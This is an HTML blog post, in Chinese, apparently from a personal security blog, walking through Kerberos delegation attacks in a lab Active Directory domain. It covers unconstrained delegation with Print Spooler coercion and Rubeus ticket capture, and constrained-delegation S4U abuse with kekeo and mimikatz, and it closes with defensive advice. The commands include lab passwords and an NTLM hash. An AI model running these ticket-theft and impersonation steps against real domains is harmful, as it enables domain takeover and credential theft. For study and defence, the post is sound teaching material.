@@ -1,0 +1,274 @@
+<!DOCTYPE html>
+<html lang="zh-Hans">
+  <head><meta charset="UTF-8"/>
+<meta http-equiv="X-UA-Compatible" content="IE=edge" />
+<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1"/>
+
+
+<meta http-equiv="Cache-Control" content="no-transform" />
+<meta http-equiv="Cache-Control" content="no-siteapp" />
+
+<meta name="theme-color" content="#f8f5ec" />
+<meta name="msapplication-navbutton-color" content="#f8f5ec">
+<meta name="apple-mobile-web-app-capable" content="yes">
+<meta name="apple-mobile-web-app-status-bar-style" content="#f8f5ec">
+
+<meta name="description" content="基于委派的测试"/><link rel="alternate" href="/atom.xml" title="Shu1L's blog"><link rel="shortcut icon" type="image/x-icon" href="/favicon.ico?v=2.11.0" />
+<link rel="canonical" href="https://shu1l.github.io/2021/09/11/ji-yu-wei-pai-de-ce-shi/"/>
+
+<link rel="stylesheet" type="text/css" href="/lib/fancybox/jquery.fancybox.css" />
+<link rel="stylesheet" type="text/css" href="/css/style.css?v=2.11.0" />
+
+<script id="baidu_push">
+(function(){
+    var bp = document.createElement('script');
+    var curProtocol = window.location.protocol.split(':')[0];
+    if (curProtocol === 'https') {
+        bp.src = 'https://zz.bdstatic.com/linksubmit/push.js';
+    }
+    else {
+        bp.src = 'http://push.zhanzhang.baidu.com/push.js';
+    }
+    var s = document.getElementsByTagName("script")[0];
+    s.parentNode.insertBefore(bp, s);
+})();
+</script>
+<script>
+  window.config = {"leancloud":{"app_id":null,"app_key":null},"toc":true,"fancybox":true,"pjax":"","latex":false};
+</script>
+
+    <title>基于委派的测试 - Shu1L's blog</title>
+  <meta name="generator" content="Hexo 4.2.0"><link rel="alternate" href="/atom.xml" title="Shu1L's blog" type="application/atom+xml">
+<link rel="stylesheet" href="/css/prism-tomorrow.css" type="text/css"></head>
+
+  <body><div id="mobile-navbar" class="mobile-navbar">
+  <div class="mobile-header-logo">
+    <a href="/." class="logo">Shu1L's blog</a>
+  </div>
+  <div class="mobile-navbar-icon">
+    <span></span>
+    <span></span>
+    <span></span>
+  </div>
+</div>
+
+<nav id="mobile-menu" class="mobile-menu slideout-menu">
+  <ul class="mobile-menu-list"><a href="/">
+        <li class="mobile-menu-item">Home
+          </li>
+      </a><a href="/archives/">
+        <li class="mobile-menu-item">Archives
+          </li>
+      </a><a href="/tags/">
+        <li class="mobile-menu-item">Tags
+          </li>
+      </a><a href="/categories/">
+        <li class="mobile-menu-item">Categories
+          </li>
+      </a><a href="/about/">
+        <li class="mobile-menu-item">About
+          </li>
+      </a></ul>
+</nav>
+<div class="container" id="mobile-panel">
+      <header id="header" class="header"><div class="logo-wrapper">
+  <a href="/." class="logo">Shu1L's blog</a>
+</div>
+
+<nav class="site-navbar"><ul id="menu" class="menu"><li class="menu-item">
+          <a class="menu-item-link" href="/">
+            Home
+            </a>
+        </li>
+      <li class="menu-item">
+          <a class="menu-item-link" href="/archives/">
+            Archives
+            </a>
+        </li>
+      <li class="menu-item">
+          <a class="menu-item-link" href="/tags/">
+            Tags
+            </a>
+        </li>
+      <li class="menu-item">
+          <a class="menu-item-link" href="/categories/">
+            Categories
+            </a>
+        </li>
+      <li class="menu-item">
+          <a class="menu-item-link" href="/about/">
+            About
+            </a>
+        </li>
+      </ul></nav>
+</header>
+
+      <main id="main" class="main">
+        <div class="content-wrapper">
+          <div id="content" class="content"><article class="post">
+    <header class="post-header">
+      <h1 class="post-title">基于委派的测试
+        </h1>
+
+      <div class="post-meta">
+        <span class="post-time">
+          2021-09-11
+        </span></div>
+    </header>
+
+    <div class="post-toc" id="post-toc">
+    <h2 class="post-toc-title">Contents</h2>
+    <div class="post-toc-content">
+      <ol class="toc"><li class="toc-item toc-level-3"><a class="toc-link" href="#前言"><span class="toc-text">前言</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#域委派的基本过程"><span class="toc-text">域委派的基本过程</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#非约束性委派-Unconstrained-delegation）"><span class="toc-text">非约束性委派(Unconstrained delegation）</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#原理"><span class="toc-text">原理</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#实际场景中的利用-非约束委派-Spooler打印机"><span class="toc-text">实际场景中的利用(非约束委派+Spooler打印机)</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#约束性委派"><span class="toc-text">约束性委派</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#原理-1"><span class="toc-text">原理</span></a><ol class="toc-child"><li class="toc-item toc-level-5"><a class="toc-link" href="#与非约束性委派的区别"><span class="toc-text">与非约束性委派的区别</span></a></li></ol></li><li class="toc-item toc-level-4"><a class="toc-link" href="#实际利用"><span class="toc-text">实际利用</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#委派攻击的防御"><span class="toc-text">委派攻击的防御</span></a></li></ol>
+    </div>
+  </div><div class="post-content"><h3 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h3><p>​    域委派是大型网络中经常部署的应用模式，给多跳认证带来很大的便利，同时也带来很大的安全隐患，利用 委派可获取域管理员权限，甚至制作深度隐藏的后门域委派是指将域内用户的权限委派给服务账号，使得<strong>服务账号能以用户权限</strong>开展域内活动。</p>
+<h4 id="域委派的基本过程"><a href="#域委派的基本过程" class="headerlink" title="域委派的基本过程"></a>域委派的基本过程</h4><p>​    委派（Delegation）是kerberos相对于NTLM认证独有的特性，指的是A可以让B<strong>“代理”</strong>自己去访问C服务，说是代理，也可以理解为<strong>“假冒”</strong>。</p>
+<p>​    具体为：域中A使用Kerberos身份验证访问域中的服务B，而B再利用A的身份去请求域中的服务C，因为用的是A的身份，所以只有A有权限访问C的时候，委派才能成功。</p>
+<h3 id="非约束性委派-Unconstrained-delegation）"><a href="#非约束性委派-Unconstrained-delegation）" class="headerlink" title="非约束性委派(Unconstrained delegation）"></a>非约束性委派(Unconstrained delegation）</h3><h4 id="原理"><a href="#原理" class="headerlink" title="原理"></a>原理</h4><p>​    我们上面说了域委派的基本过程,对于非约束性委派来说，<strong>即无限制的转发，B可以用从A处得到的TGT访问任意服务，其中B也可以是任意服务。</strong></p>
+<p><strong>注意:</strong></p>
+<p>这里的委派的账户必须是”服务账户”或者”机器账户”。</p>
+<h4 id="实际场景中的利用-非约束委派-Spooler打印机"><a href="#实际场景中的利用-非约束委派-Spooler打印机" class="headerlink" title="实际场景中的利用(非约束委派+Spooler打印机)"></a>实际场景中的利用(非约束委派+Spooler打印机)</h4><p>​    根据上面的原理我们知道,要想实现非约束性委派,<strong>必须让域用户访问我们启用了”非约束委派”的机器</strong>。但实战这种情况几乎不可能。</p>
+<p>利用非约束委派+Spooler打印机服务可以强制指定的主机进行连接：</p>
+<figure class="highlight stata"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">利用Windows打印系统远程协议（MS-RPRN）中的一种旧的但是默认启用的方法，在该方法中，域用户可以使用MS-RPRN RpcRemoteFindFirstPrinterChangeNotification（<span class="keyword">Ex</span>）方法强制任何运行了Spooler服务的计算机以通过Kerberos或NTLM对攻击者选择的目标进行身份验证。</span><br></pre></td></tr></table></figure>
+
+<p><img src="/2021/09/11/ji-yu-wei-pai-de-ce-shi/QQ%E6%88%AA%E5%9B%BE20210821195008.png" alt></p>
+<p>这里的查找主要是分为<strong>用户账户和服务账户</strong>,我这里使用的是ADfind,还可以使用Powerview，或者ladpserach</p>
+<p>查找域中配置非约束委派的用户：</p>
+<figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="selector-tag">adfind</span><span class="selector-class">.exe</span> <span class="selector-tag">-h</span> 172<span class="selector-class">.23</span><span class="selector-class">.119</span><span class="selector-class">.119</span> <span class="selector-tag">-u</span> <span class="selector-tag">klion</span>\<span class="selector-tag">xuefeng</span><span class="selector-class">.wang</span> <span class="selector-tag">-up</span> <span class="selector-tag">wxf123</span>!@#45 -b <span class="string">"DC=klion,DC=local"</span> -f <span class="string">"(&amp;(samAccountType=805306368)(userAccountControl:1.2.840.113556.1.4.803:=524288))"</span> cn distinguishedName</span><br></pre></td></tr></table></figure>
+
+<p><img src="/2021/09/11/ji-yu-wei-pai-de-ce-shi/QQ%E6%88%AA%E5%9B%BE20210821205431.png" alt></p>
+<p>查找域中配置非约束委派的主机：</p>
+<figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="selector-tag">adfind</span><span class="selector-class">.exe</span> <span class="selector-tag">-h</span> 172<span class="selector-class">.23</span><span class="selector-class">.119</span><span class="selector-class">.119</span> <span class="selector-tag">-u</span> <span class="selector-tag">klion</span>\<span class="selector-tag">xuefeng</span><span class="selector-class">.wang</span> <span class="selector-tag">-up</span> <span class="selector-tag">wxf123</span>!@#45 -b <span class="string">"DC=klion,DC=local"</span> -f <span class="string">"(&amp;(samAccountType=805306369)(userAccountControl:1.2.840.113556.1.4.803:=524288))"</span> cn distinguishedName</span><br></pre></td></tr></table></figure>
+
+<p><img src="/2021/09/11/ji-yu-wei-pai-de-ce-shi/QQ%E6%88%AA%E5%9B%BE20210821205247.png" alt></p>
+<p>或者使用powerView脚本:</p>
+<p><img src="/2021/09/11/ji-yu-wei-pai-de-ce-shi/QQ%E6%88%AA%E5%9B%BE20210822182240.png" alt></p>
+<p>这里的就以红框里的OA机器来测试，假设我们这里已经通过其他手段拿到了OA这台机器的权限。</p>
+<p><code>Print Spooler</code>服务默认是自动运行的</p>
+<p><img src="/2021/09/11/ji-yu-wei-pai-de-ce-shi/QQ%E6%88%AA%E5%9B%BE20210822190528.png" alt></p>
+<p>首先,在 OA 机器上监控登录,并实时转存 TGT, 注,此操作需要本地管理权限</p>
+<figure class="highlight smali"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Rubeus.exe<span class="built_in"> monitor </span>/interval:1 /filteruser:dc01$</span><br></pre></td></tr></table></figure>
+
+<p>向DM2012的<code>Spooler</code>服务发送请求，强制其访问win10进行身份验证</p>
+<p><img src="/2021/09/11/ji-yu-wei-pai-de-ce-shi/QQ%E6%88%AA%E5%9B%BE20210822150637.png" alt></p>
+<p>OA上此时成功收到TGT，并转存TGT</p>
+<p><img src="/2021/09/11/ji-yu-wei-pai-de-ce-shi/QQ%E6%88%AA%E5%9B%BE20210822151441.png" alt></p>
+<p>然后通过PTT，既可以远程同步域控ntds</p>
+<p><img src="/2021/09/11/ji-yu-wei-pai-de-ce-shi/QQ%E6%88%AA%E5%9B%BE20210822151937.png" alt></p>
+<h3 id="约束性委派"><a href="#约束性委派" class="headerlink" title="约束性委派"></a>约束性委派</h3><h4 id="原理-1"><a href="#原理-1" class="headerlink" title="原理"></a>原理</h4><p>​     微软自2003之后引入”约束委派”,其中包括kerberos协议的两个扩展,<strong>S4USelf，S4U2Proxy</strong>，当某个域内机器配置了约束委派，那么该机器即可接受域内任意用户的委派去请求域内的指定服务。</p>
+<p><strong>大概流程:</strong></p>
+<ul>
+<li><p>当收到来自域用户的请求后，service1使用<strong>S4U2SELF协议</strong>代表用户去请求一个可以访问<strong>Service1自身的可转发的服务票据1。</strong></p>
+</li>
+<li><p>Service1通过服务票据用<strong>S4UProxy协议</strong>以该用户身份向KDC请求一个可以<strong>访问Service2的可转发的</strong></p>
+<p><strong>服务票据2</strong></p>
+</li>
+<li><p>Service1在收到这个服务票据即可代表该用户去访问Service2。</p>
+</li>
+</ul>
+<p><strong>注意区分这里的票据1和票据2：</strong></p>
+<ul>
+<li>第一个票据表示域控授权 Service1 可以代表指定用户来访问 Service1</li>
+<li>第二个票据代表域控授权 service1 代表指定用户来访问 service2,</li>
+</ul>
+<h5 id="与非约束性委派的区别"><a href="#与非约束性委派的区别" class="headerlink" title="与非约束性委派的区别"></a>与非约束性委派的区别</h5><h4 id="实际利用"><a href="#实际利用" class="headerlink" title="实际利用"></a>实际利用</h4><p>我们可以在域控的<strong>Active Directory 用户和计算机</strong>的用户组中进行配置:</p>
+<p><img src="/2021/09/11/ji-yu-wei-pai-de-ce-shi/QQ%E6%88%AA%E5%9B%BE20210822210445.png" alt></p>
+<p><strong>约束委派的利用前提是我们已经拿到了设置约束委派的机器权限。</strong></p>
+<p>之后我们可以使用adfind、powerview之类的工具查找设置约束委派的用户账户和机器账户:</p>
+<figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="selector-tag">AdFind</span><span class="selector-class">.exe</span> <span class="selector-tag">-h</span> 172<span class="selector-class">.23</span><span class="selector-class">.119</span><span class="selector-class">.27</span> <span class="selector-tag">-u</span> <span class="selector-tag">k01</span>\<span class="selector-tag">sqladm</span> <span class="selector-tag">-up</span> <span class="selector-tag">admin</span>!@#45 -b <span class="string">"DC=k01,DC=local"</span> -f <span class="string">"(&amp;(objectCategory=computer)(objectClass=computer)(userAccountControl:1.2.840.113556.1.4.803:=16777216))"</span> msDS-AllowedToDelegateTo</span><br></pre></td></tr></table></figure>
+
+<p><img src="/2021/09/11/ji-yu-wei-pai-de-ce-shi/QQ%E6%88%AA%E5%9B%BE20210822211320.png" alt></p>
+<p>之后我们可以使用kekeo先生成TGT：</p>
+<p><a href="https://github.com/gentilkiwi/kekeo" target="_blank" rel="noopener">https://github.com/gentilkiwi/kekeo</a></p>
+<p>Kekeo是一个强大的票据传递工具 :</p>
+<ul>
+<li>能够从用户的哈希 (rc4_hmac/aes128_cts_hmac_sha1/aes256_cts_hmac_sha1)请求票证授予票证(TGT) ，并将请求的 TGT 应用于当前登录会话。 这为 Mimikatz 的”over-pass-the-hash” 提供了一个替代方案，该方案不操作 LSASS 的内存，也不需要管理特权</li>
+</ul>
+<ul>
+<li>从现有的 TGT 请求服务票证的能力</li>
+</ul>
+<ul>
+<li>我所知道的除了 Impacket 之外唯一实现S4U 约束委派滥用(包括 sname 替换)的工具。 </li>
+</ul>
+<figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">kekeo.exe <span class="string">"tgt::ask /user:SECRETARY-PC<span class="variable">$</span> /domain:k01.local /NTLM:7b31c1ea95144617cc21861d5ba4c8ea"</span> <span class="string">"exit"</span></span><br></pre></td></tr></table></figure>
+
+<p><img src="/2021/09/11/ji-yu-wei-pai-de-ce-shi/QQ%E6%88%AA%E5%9B%BE20210822212331.png" alt></p>
+<p>这里使用本地的ntlmhash 来生成访问 Service1的票据1</p>
+<p>然后,伪造域管模拟 S4U 协议去请求转存服务票据2:</p>
+<figure class="highlight perl"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">kekeo.exe <span class="string">"tgs::s4u /tgt:TGT_SECRETARY-PC$@K01.LOCAL_krbtgt~k01.local@K01.LOCAL.kirbi /user:Administrator@k01.local /service:cifs/POLICE-PC.k01.local"</span> <span class="string">"exit"</span></span><br></pre></td></tr></table></figure>
+
+<p><img src="/2021/09/11/ji-yu-wei-pai-de-ce-shi/QQ%E6%88%AA%E5%9B%BE20210822212458.png" alt></p>
+<p>之后我们可以mimikat来实现PTT，就能获得远程 Police-Pc 机器的权限</p>
+<figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="selector-tag">mimikatz</span><span class="selector-class">.exe</span> "<span class="selector-tag">kerberos</span><span class="selector-pseudo">::ptt</span> <span class="selector-tag">TGS_Administrator</span><span class="keyword">@k01</span>.local<span class="keyword">@K01</span>.LOCAL_cifs~POLICE-PC.k01.local<span class="keyword">@K01</span>.LOCAL.kirbi" <span class="string">"exit"</span></span><br></pre></td></tr></table></figure>
+
+<p><img src="/2021/09/11/ji-yu-wei-pai-de-ce-shi/QQ%E6%88%AA%E5%9B%BE20210822214404.png" alt></p>
+<p><img src="/2021/09/11/ji-yu-wei-pai-de-ce-shi/QQ%E6%88%AA%E5%9B%BE20210822214509.png" alt></p>
+<h3 id="委派攻击的防御"><a href="#委派攻击的防御" class="headerlink" title="委派攻击的防御"></a>委派攻击的防御</h3><ul>
+<li>不要在域中使用非约束委派功能</li>
+<li>域中不需要使用委派的账户设置为“敏感用户不能被委派”</li>
+<li>win2012的系统可以通过设置受保护的用户组来缓解委派所带来的危害</li>
+</ul>
+
+      </div>
+      <div class="post-copyright">
+    <p class="copyright-item">
+      <span>Author: </span>
+      <a href="https://shu1l.github.io">Shu1L</a>
+    </p>
+    <p class="copyright-item">
+      <span>Link: </span>
+      <a href="https://shu1l.github.io/2021/09/11/ji-yu-wei-pai-de-ce-shi/">https://shu1l.github.io/2021/09/11/ji-yu-wei-pai-de-ce-shi/</a>
+    </p>
+    <p class="copyright-item">
+      <span>License: </span><a rel="license" href="http://creativecommons.org/licenses/by-nc/4.0/" target="_blank">知识共享署名-非商业性使用 4.0 国际许可协议</a>
+    </p>
+  </div>
+      <footer class="post-footer">
+        
+        <nav class="post-nav"><a class="next" href="/2021/08/19/exchange-gong-ji-lian-fu-xian/">
+        <span class="next-text nav-default">exchange攻击链复现</span>
+        <span class="prev-text nav-mobile">Next</span>
+        <i class="iconfont icon-right"></i>
+      </a>
+    </nav></footer>
+    </article></div><div class="comments" id="comments"></div></div>
+      </main>
+
+      <footer id="footer" class="footer"><div class="social-links"><a href="mailto:hackshu1l@gmail.com" class="iconfont icon-email" title="email"></a>
+        <a href="https://github.com/Shu1L" target="_blank" rel="noopener" class="iconfont icon-github" title="github"></a>
+        <a href="/atom.xml" class="iconfont icon-rss" title="rss"></a>
+    </div><div class="copyright">
+  <span class="power-by">
+    Powered by <a class="hexo-link" href="https://hexo.io/" target="_blank" rel="noopener">Hexo</a>
+  </span>
+  <span class="division">|</span>
+  <span class="theme-info">
+    Theme - 
+    <a class="theme-link" href="https://github.com/ahonn/hexo-theme-even" target="_blank" rel="noopener">Even</a>
+  </span>
+
+  <span class="copyright-year">&copy;2015 - 2021<span class="heart">
+      <i class="iconfont icon-heart"></i>
+    </span>
+    <span class="author">Shu1L</span>
+  </span>
+</div>
+</footer>
+
+      <div class="back-to-top" id="back-to-top">
+        <i class="iconfont icon-up"></i>
+      </div>
+    </div><!-- SOHUCS Comments -->
+<div id="SOHUCS"></div>
+<script type="text/javascript">
+(function(){
+var appid = 'ScCGwbdkMqPLbNHvh2QCuo4h-gzGzoHsz';
+var conf = '5KOK9KOQQT1AL9PmmwexKn2O';
+var width = window.innerWidth || document.documentElement.clientWidth;
+if (width < 960) {window.document.write('<script id="changyan_mobile_js" charset="utf-8" type="text/javascript" src="https://changyan.sohu.com/upload/mobile/wap-js/changyan_mobile.js?client_id=' + appid + '&conf=' + conf + '"><\/script>'); } else { var loadJs=function(d,a){var c=document.getElementsByTagName("head")[0]||document.head||document.documentElement;var b=document.createElement("script");b.setAttribute("type","text/javascript");b.setAttribute("charset","UTF-8");b.setAttribute("src",d);if(typeof a==="function"){if(window.attachEvent){b.onreadystatechange=function(){var e=b.readyState;if(e==="loaded"||e==="complete"){b.onreadystatechange=null;a()}}}else{b.onload=a}}c.appendChild(b)};loadJs("https://changyan.sohu.com/upload/changyan.js",function(){window.changyan.api.config({appid:appid,conf:conf})}); } })();
+</script><script type="text/javascript" src="/lib/jquery/jquery.min.js"></script>
+  <script type="text/javascript" src="/lib/slideout/slideout.js"></script>
+  <script type="text/javascript" src="/lib/fancybox/jquery.fancybox.pack.js"></script>
+  <script type="text/javascript" src="/js/src/even.js?v=2.11.0"></script>
+</body>
+</html>
